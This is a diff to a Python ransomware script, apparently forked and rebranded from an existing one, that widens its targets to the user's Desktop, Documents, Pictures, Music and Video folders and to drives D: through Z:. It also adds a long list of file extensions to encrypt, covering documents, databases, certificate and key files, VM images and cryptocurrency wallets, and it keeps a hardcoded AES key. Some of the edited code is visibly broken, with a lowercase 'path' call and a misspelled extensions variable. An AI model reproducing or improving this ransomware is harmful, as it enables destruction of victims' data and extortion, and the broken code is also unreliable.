@@ -1,12 +1,8 @@
 #!/usr/bin/python
 
-
-# Cryptofuck: it's a simple ransomware coded using pycrypto module in python 
 # coded by Bingo 
-# twitter: @hack1lab 
-# fb.me/hack1lab, fb.me/bing00o
-# https://github.com/mohamed1lar/
-# https://hack1lab.blogspot.com/
+# twitter: @ly88321 
+# https://github.com/ly88321/crypt0
 
 
 from pathlib import Path
@@ -14,7 +10,7 @@ from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from Crypto import Random
 from sys import stdout
-import base64, os
+import base64, os,winreg
 
 
 class colors:
@@ -37,7 +33,7 @@ print(cl.red+"""
 \t    )                                           (
 \t    \ \                                       / /
 \t     \ |\                                   / |/
-\t      \|  \           hack1lab            /   /
+\t      \|  \                               /   /
 \t       \   |\         --------          / |  /
 \t        \  |  \_______________________/   | /
 \t         \ |    |      |      |      |    |/
@@ -46,8 +42,8 @@ print(cl.red+"""
 
 
 
-\t             By: @hack1lab, @mohamed1lar
-\t          fb.me/hack1lab, fb.me/mohamed1lar
+\t             By: @ly88321
+\t          https://github.com/ly88321/crypt0
 
 """+cl.end)
 
@@ -91,11 +87,56 @@ def encrypt(key, filename):
 	except IOError:
 		pass
 
-
+def get_desktop():
+	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
+	return winreg.QueryValueEx(key, "Desktop")[0]
+def get_Documents():
+	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
+	return winreg.QueryValueEx(key, "Personal")[0]
+def get_Pictures():
+	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
+	return winreg.QueryValueEx(key, "My Pictures")[0]
+def get_Music():
+	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
+	return winreg.QueryValueEx(key, "My Music")[0]
+def get_Video():
+	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
+	return winreg.QueryValueEx(key, "My Video")[0]
 
 
 #change this path to your path
-p = Path('E:\\')
+p = path(get_desktop(),
+         get_Documents(),
+         get_Pictures(),
+         get_Music(),
+         get_Video(),
+         'D:\\',
+         'E:\\',
+         'F:\\',
+         'G:\\',
+         'I:\\',
+         'J:\\',
+         'K:\\',
+         'L:\\',
+         'M:\\',
+         'N:\\',
+         'O:\\',
+         'P:\\',
+         'Q:\\',
+         'R:\\',
+         'S:\\',
+         'T:\\',
+         'U:\\',
+         'V:\\',
+         'W:\\',
+         'X:\\',
+         'Y:\\',
+         'Z:\\')
 
 #change this key with your key, remember the key must be base64 encode
 key = "aGFja2xhYg=="
@@ -104,8 +145,292 @@ list_f = []
 
 
 #extensions list
-extensions = ["*"]# ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']
-
+extentions = ['*.txt',
+              '*.exe',
+              '*.php',
+              '*.pl',
+              '*.7z',
+              '*.rar',
+              '*.m4a',
+              '*.wma',
+              '*.avi',
+              '*.wmv',
+              '*.csv',
+              '*.d3dbsp',
+              '*.sc2save',
+              '*.sie',
+              '*.sum',
+              '*.ibank',
+              '*.t13',
+              '*.t12',
+              '*.qdf',
+              '*.gdb',
+              '*.tax',
+              '*.pkpass',
+              '*.bc6',
+              '*.bc7',
+              '*.bkp',
+              '*.qic',
+              '*.bkf',
+              '*.sidn',
+              '*.sidd',
+              '*.mddata',
+              '*.itl',
+              '*.itdb',
+              '*.icxs',
+              '*.hvpl',
+              '*.hplg',
+              '*.hkdb',
+              '*.mdbackup',
+              '*.syncdb',
+              '*.gho',
+              '*.cas',
+              '*.svg',
+              '*.map',
+              '*.wmo',
+              '*.itm',
+              '*.sb',
+              '*.fos',
+              '*.mcgame',
+              '*.vdf',
+              '*.ztmp',
+              '*.sis',
+              '*.sid',
+              '*.ncf',
+              '*.menu',
+              '*.layout',
+              '*.dmp',
+              '*.blob',
+              '*.esm',
+              '*.001',
+              '*.vtf',
+              '*.dazip',
+              '*.fpk',
+              '*.mlx',
+              '*.kf',
+              '*.iwd',
+              '*.vpk',
+              '*.tor',
+              '*.psk',
+              '*.rim',
+              '*.w3x',
+              '*.fsh',
+              '*.ntl',
+              '*.arch00',
+              '*.lvl',
+              '*.snx',
+              '*.cfr',
+              '*.ff',
+              '*.vpp_pc',
+              '*.lrf',
+              '*.m2',
+              '*.mcmeta',
+              '*.vfs0',
+              '*.mpqge',
+              '*.kdb',
+              '*.db0',
+              '*.mp3',
+              '*.upx',
+              '*.rofl',
+              '*.hkx',
+              '*.bar',
+              '*.upk',
+              '*.das',
+              '*.iwi',
+              '*.litemod',
+              '*.asset',
+              '*.forge',
+              '*.ltx',
+              '*.bsa',
+              '*.apk',
+              '*.re4',
+              '*.sav',
+              '*.lbf',
+              '*.slm',
+              '*.bik',
+              '*.epk',
+              '*.rgss3a',
+              '*.pak',
+              '*.big',
+              '*.unity3d',
+              '*.wotreplay',
+              '*.xxx',
+              '*.desc',
+              '*.py',
+              '*.m3u',
+              '*.flv',
+              '*.js',
+              '*.css',
+              '*.rb',
+              '*.png',
+              '*.jpeg',
+              '*.p7c',
+              '*.p7b',
+              '*.p12',
+              '*.pfx',
+              '*.pem',
+              '*.crt',
+              '*.cer',
+              '*.der',
+              '*.x3f',
+              '*.srw',
+              '*.pef',
+              '*.ptx',
+              '*.r3d',
+              '*.rw2',
+              '*.rwl',
+              '*.raw',
+              '*.raf',
+              '*.orf',
+              '*.nrw',
+              '*.mrwref',
+              '*.mef',
+              '*.erf',
+              '*.kdc',
+              '*.dcr',
+              '*.cr2',
+              '*.crw',
+              '*.bay',
+              '*.sr2',
+              '*.srf',
+              '*.arw',
+              '*.3fr',
+              '*.dng',
+              '*.jpeg',
+              '*.jpg',
+              '*.cdr',
+              '*.indd',
+              '*.ai',
+              '*.eps',
+              '*.pdf',
+              '*.pdd',
+              '*.psd',
+              '*.dbfv',
+              '*.mdf',
+              '*.wb2',
+              '*.rtf',
+              '*.wpd',
+              '*.dxg',
+              '*.xf',
+              '*.dwg',
+              '*.pst',
+              '*.accdb',
+              '*.mdb',
+              '*.pptm',
+              '*.pptx',
+              '*.ppt',
+              '*.xlk',
+              '*.xlsb',
+              '*.xlsm',
+              '*.xlsx',
+              '*.xls',
+              '*.wps',
+              '*.docm',
+              '*.docx',
+              '*.doc',
+              '*.odb',
+              '*.odc',
+              '*.odm',
+              '*.odp',
+              '*.ods',
+              '*.odt',
+              '*.sql',
+              '*.zip',
+              '*.tar',
+              '*.tar.gz',
+              '*.tgz',
+              '*.biz',
+              '*.ocx',
+              '*.html',
+              '*.htm',
+              '*.3gp',
+              '*.srt',
+              '*.cpp',
+              '*.mid',
+              '*.mkv',
+              '*.mov',
+              '*.asf',
+              '*.mpeg',
+              '*.vob',
+              '*.mpg',
+              '*.fla',
+              '*.swf',
+              '*.wav',
+              '*.qcow2',
+              '*.vdi',
+              '*.vmdk',
+              '*.vmx',
+              '*.gpg',
+              '*.aes',
+              '*.ARC',
+              '*.PAQ',
+              '*.tar.bz2',
+              '*.tbk',
+              '*.bak',
+              '*.djv',
+              '*.djvu',
+              '*.bmp',
+              '*.cgm',
+              '*.tif',
+              '*.tiff',
+              '*.NEF',
+              '*.cmd',
+              '*.class',
+              '*.jar',
+              '*.java',
+              '*.asp',
+              '*.brd',
+              '*.sch',
+              '*.dch',
+              '*.dip',
+              '*.vbs',
+              '*.asm',
+              '*.pas',
+              '*.ldf',
+              '*.ibd',
+              '*.MYI',
+              '*.MYD',
+              '*.frm',
+              '*.dbf',
+              '*.SQLITEDB',
+              '*.SQLITE3',
+              '*.asc',
+              '*.lay6',
+              '*.lay',
+              '*.ms11 (Security copy)',
+              '*.sldm',
+              '*.sldx',
+              '*.ppsm',
+              '*.ppsx',
+              '*.ppam',
+              '*.docb',
+              '*.mml',
+              '*.sxm',
+              '*.otg',
+              '*.slk',
+              '*.xlw',
+              '*.xlt',
+              '*.xlm',
+              '*.xlc',
+              '*.dif',
+              '*.stc',
+              '*.sxc',
+              '*.ots',
+              '*.ods',
+              '*.hwp',
+              '*.dotm',
+              '*.dotx',
+              '*.docm',
+              '*.DOT',
+              '*.max',
+              '*.xml',
+              '*.uot',
+              '*.stw',
+              '*.sxw',
+              '*.ott',
+              '*.csr',
+              '*.key',
+              'wallet.dat']
 #f = raw_input("the files format> ")
 
 for extension in extensions:
